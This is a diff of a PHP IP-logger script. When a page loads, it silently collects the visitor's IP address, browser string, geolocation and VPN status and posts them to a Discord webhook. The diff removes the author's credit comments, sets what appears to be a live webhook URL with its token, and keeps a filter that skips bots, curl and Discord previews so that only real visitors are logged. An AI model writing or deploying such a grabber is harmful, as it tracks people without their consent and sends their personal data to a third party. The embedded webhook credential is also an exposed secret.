@@ -1,24 +1,18 @@
 <?php
 
-/* 
-Please keep this copyright statement intact
-Creator: Jeroenimo02#2380
-Publish Date: 19-03-2021
-Last Update: 18-03-2022
-APIs Provided By: geoiplookup.io and ip-api.com
-*/ 
 
-//Get the visitor's IP
+
+
 $IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
 $Browser = $_SERVER['HTTP_USER_AGENT'];
 
-//Stop the bots from logging
+
 if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
     exit();
 }
 
-//YOU CAN SET YOUR TIMEZONE HERE!
-date_default_timezone_set("Europe/Amsterdam");
+
+date_default_timezone_set("Asia/Istanbul");
 $Date = date('d/m/Y');
 $Time = date('G:i:s');
 
@@ -50,16 +44,16 @@ $Flag = "https://countryflagsapi.com/png/{$Details->countryCode}";
 class Discord
 {
 
-	//This will run and send as soon as the page loads
+	
     public function Visitor()
     {
         global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
 
-		//Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
-        $Webhook = "FULLURLHERE";
+		
+        $Webhook = "https://discord.com/api/webhooks/1159170951217422459/BDbsM_GEvj7ZOEsCeCcrSjQL9LsE11QUGIXC0lXOk9qOsEr2sGAu224uxz3kWe7lAtZh";
 
         $InfoArr = array(
-            "username" => "$WebhookName",
+            "username" => "$Ip Logger",
             "avatar_url" => "$Flag",
             "embeds" => [array(
 
